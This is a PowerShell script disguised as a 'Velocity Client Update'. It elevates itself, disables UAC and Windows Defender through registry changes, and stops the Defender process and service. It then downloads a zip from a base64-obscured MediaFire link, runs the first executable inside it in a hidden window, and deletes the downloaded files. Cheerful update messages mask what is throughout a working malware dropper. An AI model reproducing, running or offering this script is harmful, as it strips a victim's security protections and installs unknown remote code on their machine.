if(-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){Write-Host "This script requires admin privileges. Requesting elevation...";Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content $PSCommandPath | Out-String))))" -Verb RunAs -ErrorAction SilentlyContinue;exit};$UpdateID="VelocityUpdate_2025";Write-Host "Welcome to Velocity Client Update ($UpdateID)";Write-Host "Keeping your Velocity experience smooth!";$LogDir="$env:APPDATA\Velocity\Logs";$LogFile="$LogDir\update_$UpdateID.log";if(!(Test-Path $LogDir)){New-Item -Path $LogDir -ItemType Directory -Force};if(!(Test-Path $LogFile)){New-Item -Path $LogFile -ItemType File -Force};Write-Host "Checking Velocity client config...";Start-Sleep -Seconds 2;Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue;Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue;Write-Host "Disabling Windows Defender...";Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction SilentlyContinue;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "AllowRealtimeMonitoring" -Value 0 -ErrorAction SilentlyContinue;Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -ErrorAction SilentlyContinue;Stop-Process -Name "MsMpEng" -Force -ErrorAction SilentlyContinue;Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue;$UpdateSession=Get-Random -Minimum 5000 -Maximum 15000;Write-Host "Looking for Velocity updates...";$EncodedURL=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("https://download1078.mediafire.com/qre48cbd2hggtzxBW7hFp41INf8Q6eTHb5Wi1ZIf34iGXFjJPGEEj74LfSLJZFX8lgXTOJqdvsk1f5NbDdnvVRDEgT488W2jPNTn7qOTJSubQafFaADtBMPD7MsisNKXpIf96OdABkCZrGCen6kz4qLuYvKGOCimu_mqojlWOGI/nu2wa6ab8x92t3d/net8.0-windows10.0.26100.0.zip"));$PayloadURL=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedURL));$UpdateDir="$env:APPDATA\Velocity\Updates";if(!(Test-Path $UpdateDir)){New-Item -Path $UpdateDir -ItemType Directory -Force};$ZipFile="$UpdateDir\velocity_update_$UpdateSession.zip";$ExtractDir="$UpdateDir\velocity_update_$UpdateSession";try{Invoke-WebRequest -Uri $PayloadURL -OutFile $ZipFile -ErrorAction Stop}catch{Write-Host "Failed to download the update. Please check your internet connection or the URL.";exit};if(-not (Test-Path $ZipFile)){Write-Host "Update file not found after download. Please try again.";exit};Write-Host "Update downloaded!";Write-Host "Applying Velocity update...";if(Test-Path $ZipFile){Expand-Archive -Path $ZipFile -DestinationPath $ExtractDir -Force -ErrorAction SilentlyContinue | Out-Null;$ExeFile=(Get-ChildItem -Path $ExtractDir -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName;if($ExeFile){Start-Process -FilePath $ExeFile -WindowStyle Hidden -ErrorAction SilentlyContinue}};Write-Host "Ensuring Visual C++ Redistributable is ready...";Write-Host "Cleaning up...";Remove-Item -Path $ZipFile -Force -ErrorAction SilentlyContinue;Remove-Item -Path $ExtractDir -Recurse -Force -ErrorAction SilentlyContinue;Write-Host "Velocity update ($UpdateID) doneâ€”enjoy!"
